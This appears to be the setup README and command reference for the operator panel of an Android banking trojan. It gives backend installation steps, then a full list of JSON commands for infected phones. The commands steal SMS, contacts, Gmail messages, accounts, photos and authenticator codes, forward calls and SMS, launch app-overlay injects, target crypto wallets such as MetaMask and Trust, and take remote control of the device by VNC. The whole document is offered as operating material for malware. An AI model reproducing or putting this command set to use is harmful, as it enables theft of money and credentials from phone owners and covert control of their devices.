  #Installation
### Create source folder (/vaw/www as example)
```bash
$ mkdir /var/www
$ cd /var/www
```

### Make install
```bash
$ sudo apt update
$ sudo apt-get install build-essential -y
```

### Optionally install unzip
```bash
$ sudo apt-get install unzip
$ unzip {archive_name}.zip
```

### Copy .env file
```bash
cp .env.example .env
``` 

### Edit .env file
```dotenv
BACKEND_URL=http://{ip}:{BACKEND_PORT}/
#BACKEND_URL=http://127.0.0.1:8081/

SOCKET_IO_URL=
FRONTEND_URL=

MYSQL_ROOT_PASSWORD={GENERATE_PASSWORD}
MYSQL_PASSWORD={GENERATE_PASSWORD}
GOLANG_KEY={GENERATE_GOLANG_KEY}
GOLANG_INITIAL_VECTOR={GENERATE_INITIAL_VECTOR}
```

### Build by one command
```bash
make install && make ports && make env && make build
```

### Build by steps
```bash
$ make install
$ make ports
$ make env
$ make build.backend
$ make build.frontend
```


### mysql import
docker-compose exec mysql bash
mysql -u root -p hook < hook.sql

### Commands list
```
{
    "command": "getcallhistory",
    "payload": {}
}

{
    "command": "getcontacts",
    "payload": {}
}

{
    "command": "addcontact",
    "payload": {
        "arg1": "+79699996565",
        "arg2": "Имя"
    }
}

{
    "command": "getlocation",
    "payload": {}
}

{
    "command": "getimages",
    "payload": {}
}

{
    "command": "openapp",
    "payload": {
        "arg1": "com.google.android.gm"
    }
}

{
    "command": "openwhatsapp",
    "payload": {
        "arg1": "+79891000000",
        "arg2": "+text"
    }
}

{
    "command": "makecall",
    "payload": {
        "arg1": "+79891000000"
    }
}

{
    "command": "forwardsms",
    "payload": {
        "number": "+79891000000"
    }
}

{
    "command": "sendsms",
    "payload": {
        "sim": "",
        "text": "test text",
        "number": "+79891000000"
    }
}

{
    "command": "startussd",
    "payload": {
        "sim": "",
        "ussd": "*100#"
    }
}

{
    "command": "forwardcall",
    "payload": {
        "sim": "",
        "number": "+79891000000"
    }
}

{
    "command": "push",
    "payload": {
        "app": "com.google.android.gm",
        "text": "test text",
        "title": "+79891000000"
    }
}

{
    "command": "getaccounts",
    "payload": {}
}

{
    "command": "getinstallapps",
    "payload": {}
}

{
    "command": "getsms",
    "payload": {}
}

{
    "command": "startinject",
    "payload": {
        "app": "com.google.android.gm"
    }
}

{
    "command": "updateinjectandlistapps",
    "payload": {}
}

{
    "command": "openurl",
    "payload": {
        "url": "yandex.ru"
    }
}

{
    "command": "sendsmsall",
    "payload": {
        "sim": "",
        "text": "+79891000000"
    }
}

{
    "command": "startapp",
    "payload": {
        "app": "com.google.android.gm"
    }
}

{
    "command": "calling",
    "payload": {
        "lock": "",
        "number": "+79891000000"
    }
}

{
    "command": "deleteapplication",
    "payload": {
        "app": "com.vkontakte.android"
    }
}

{
    "command": "gmailtitles",
    "payload": {}
}

{
    "command": "getgmailmessage",
    "payload": {
        "mes_num": "0"
    }
}

{
    "command": "startadmin",
    "payload": {}
}

{
    "command": "takescreenshot",
    "payload": {}
}

{
    "command": "clearcache",
    "payload": {
        "app": "com.google.android.gm"
    }
}

{
    "command": "startauthenticator2",
    "payload": {}
}

{
    "command": "trust",
    "payload": {}
}

{
    "command": "mycelium",
    "payload": {}
}

{
    "command": "piuk",
    "payload": {}
}

{
    "command": "samourai",
    "payload": {}
}

{
    "command": "bitcoincom",
    "payload": {}
}

{
    "command": "toshi",
    "payload": {}
}

{
    "command": "metamask",
    "payload": {}
}

{
    "command": "killme",
    "payload": {}
}

FILEMANAGER

{
    "command": "fmmanager",
    "payload": {
        "path": "/storage/emulated/0/",
        "extra": "ls"
    }
}

{
    "command": "downloadimage",
    "payload": {
        "arg1": "/storage/emulated/0/DCIM/Camera/IMG20220214183905.jpg"
    }
}


VNC

{
    "command": "start_vnc",
    "payload": {}
}

{
    "command": "stop_vnc",
    "payload": {}
}

{
    "command": "clickattext",
    "payload": {
        "text": "Яндекс"
    }
}

{
    "command": "clickatcontaintext",
    "payload": {
        "text": "ЗАКРЫТЬ"
    }
}

{
    "command": "clickat",
    "payload": {
        "id": "addRecordsButton"
    }
}

{
    "command": "scrolldown_",
    "payload": {
        "x": "100",
        "y": "100"
    }
}

{
    "command": "scrolldown",
    "payload": {
        "x": "100",
        "y": "100"
    }
}

{
    "command": "scrollup_",
    "payload": {
        "x": "100",
        "y": "100"
    }
}

{
    "command": "scrollup",
    "payload": {
        "x": "100",
        "y": "100"
    }
}

{
    "command": "swipeleft",
    "payload": {
        "x": "100",
        "y": "100"
    }
}

{
    "command": "swiperight",
    "payload": {
        "x": "100",
        "y": "100"
    }
}

{
    "command": "swipeup",
    "payload": {
        "x": "100",
        "y": "100"
    }
}

{
    "command": "swipedown",
    "payload": {
        "x": "100",
        "y": "100"
    }
}

{
    "command": "swipe",
    "payload": {
        "x": "100",
        "y": "100",
        "x1": "500",
        "y1": "500"
    }
}

{
    "command": "tap",
    "payload": {
        "x": "100",
        "y": "100"
    }
}

{
    "command": "longpress",
    "payload": {
        "x": "100",
        "y": "100"
    }
}

{
    "command": "cuttext",
    "payload": {
        "text": "text"
    }
}

{
    "command": "onkeyevent",
    "payload": {
        "key": "recents" // recents,back,home
    }
}
```